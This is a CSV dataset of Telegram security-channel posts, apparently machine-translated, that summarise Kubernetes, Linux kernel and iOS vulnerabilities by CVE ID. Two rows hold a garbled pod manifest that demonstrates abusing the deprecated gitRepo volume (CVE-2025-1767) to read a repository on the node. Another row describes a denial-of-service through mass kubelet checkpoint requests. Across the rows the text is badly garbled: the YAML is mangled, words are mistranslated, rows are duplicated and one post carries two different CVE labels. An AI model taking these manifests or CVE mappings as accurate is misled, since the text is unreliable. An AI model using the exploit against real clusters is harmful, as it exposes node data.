id,cve_id,channel_name,message,timestamp,message_url
131,CVE-2025-1767,k8security,"In `kubernetes`, another vulnerability is revealed-(you probably noticed that some resources can hang in the status of` terminated` when removing `namespace` whole. So the order of removal of resources with such` namespace tarmination` is not determined, and this can lead to the fact that at some point in time `pods` Still to work, and `Network Policy` will no longer exist and apply to` pods`. `Alpha` in` 1.33`.",2025-06-01 01:34:34.883595,https://t.me/k8security/1481
132,CVE-2024-7598,k8security,"In `kubernetes`, another vulnerability is revealed-(you probably noticed that some resources can hang in the status of` terminated` when removing `namespace` whole. So the order of removal of resources with such` namespace tarmination` is not determined, and this can lead to the fact that at some point in time `pods` Still to work, and `Network Policy` will no longer exist and apply to` pods`. `Alpha` in` 1.33`.",2025-06-01 01:34:34.883607,https://t.me/k8security/1481
133,CVE-2025-1767,k8security,"Returning to `CVE-2025-1767`, about which we (last Friday, we can not help but mention the rather simple operation of this bug:` `` `apIVERSION: v1 kind: name metadata: git-revo-pod-test spec: containers:-name: name: name GIT-REPO-Test-Container Image: Raesene /Alpine-Containertools Volumemounts:-NAME: GIT-VOLUME MOUNTPATH: /TMP Volumes:-Name: Git-Volume Gitrepo: Repository: ""/Testingscripts"" Directory: ""."" `` About this `Rory McCune 'told in his article (by the way, after the release of` CVE-2025-1767`, discussions were activated about sawing `gitrepo volume` 1.33` by default.",2025-06-01 01:34:34.884514,https://t.me/k8security/1474
134,CVE-2025-1767,k8security,"Returning to `CVE-2025-1767`, about which we (last Friday, we can not help but mention the rather simple operation of this bug:` `` `apIVERSION: v1 kind: name metadata: git-revo-pod-test spec: containers:-name: name: name GIT-REPO-Test-Container Image: Raesene /Alpine-Containertools Volumemounts:-NAME: GIT-VOLUME MOUNTPATH: /TMP Volumes:-Name: Git-Volume Gitrepo: Repository: ""/Testingscripts"" Directory: ""."" `` About this `Rory McCune 'told in his article (by the way, after the release of` CVE-2025-1767`, discussions were activated about sawing `gitrepo volume` 1.33` by default.",2025-06-01 01:34:34.884524,https://t.me/k8security/1474
135,CVE-2025-1767,k8security,"The next `unpatchable`` cve` in `kubernetes`-(vulnerability allows users with the rights to create` pods` to use `gitrepo`` volumes` to access the local `git`-re posories belonging to the same` node`. Because the functionality is. `In-Trepo Volumes' was recognized as` Depreded` and will not receive security updates, all clusters using this function remain vulnerable, nevertheless, `6.5` in the` cvss` Clone`, and then mount the catalog in the main container: `` `APIVERSION: V1 Kind: Pod Metadata: Name: Git -Repo -Demo Spec: Initcontainers: -Name: Git -Klone/Git Args: -Clone -Clone - Single -Branch - - - - /repo Volumemounts: - name: git -comma mountPath: /repo containers: - name: Busybox Image: Busybox Args: Volumemounts: - Name: GIT -REPO MountPath: /Repo Volumes: - Name: Git -Repo Emptydir: {} `` `` `` ``",2025-06-01 01:34:34.884858,https://t.me/k8security/1471
136,CVE-2024-0132,k8security,"If you do not have enough hardcore in the topic of containers' safety and `kubernetes`, then it was specially for you that an article has been published on the blog” (the theme is acute, hot seasoned `ml`-clusters, video cards drivers, an attack by` toctou`, the problem of extension `symlinks`;) while the topic is very relevant due The number of systems working with video cards.",2025-06-01 01:34:34.887674,https://t.me/k8security/1449
137,CVE-2024-0132,k8security,"If you do not have enough hardcore in the topic of containers' safety and `kubernetes`, then it was specially for you that an article has been published on the blog” (the theme is acute, hot seasoned `ml`-clusters, video cards drivers, an attack by` toctou`, the problem of extension `symlinks`;) while the topic is very relevant due The number of systems working with video cards.",2025-06-01 01:34:34.887684,https://t.me/k8security/1449
138,CVE-2024-36972,k8security,"Last year, another vulnerability in the nucleus was disclosed-`CVE-2024-36972`. And in addition to the local increase in privileges by operating this vulnerability, you can achieve `Container Escape`! Baga was discovered as part of `kernelctf`. And recently appeared (vulnerability affects rather fresh versions of nuclei: `v6.8 - v6.9 v5.15.147 v6.1.78 v6.6.17`",2025-06-01 01:34:34.887776,https://t.me/k8security/1448
139,CVE-2025-0426,k8security,"`2025`y year began with the next` cve` for `kubernetes`. (affectitis `kubelet` with` 1.32.0 - 1.32.1. 1.31.0 - 1.31.5, 1.30.0 - 1.30.9`, as well as all versions to `1.25,` since support is `Container CheckPoint` was added as` Alpha Feature. It is enough for the attacker to send a large number of requests for the creation of `Container Checkpoint` on` Read-ONLY HTTP Port`, which will cause repeated creation of files with `checkpoints` in`/var/kubelet/checkpoints and as a result will arrange `DOS` for` DOS` for `Node`. It is turned on a separate parameter in the configa 2) used `Container Runtime` must support` Container Checkpointing Feature`, for example, `CRI-O V1.25.0+` CONTainerd v2.0+`` Kubeapi 'must be included `Containercheckpoint feature gate`",2025-06-01 01:34:34.888147,https://t.me/k8security/1445
140,CVE-2025-24200,mobile_appsec_world,"Technical description of the vulnerabilities of the CVE-2025-24200 And here it arrived very much (described (with USB access in the latest versions of iOS. The article describes in detail how the researchers found the changed parts of the firmware in the Apple Security Patch compared to the previous version. Even if you are not very interesting about this vulnerability, I advise you to read the sake of the described for the described A relatively simple way to compare several versions of the firmware.",2025-06-01 01:34:43.466669,https://t.me/mobile_appsec_world/1008
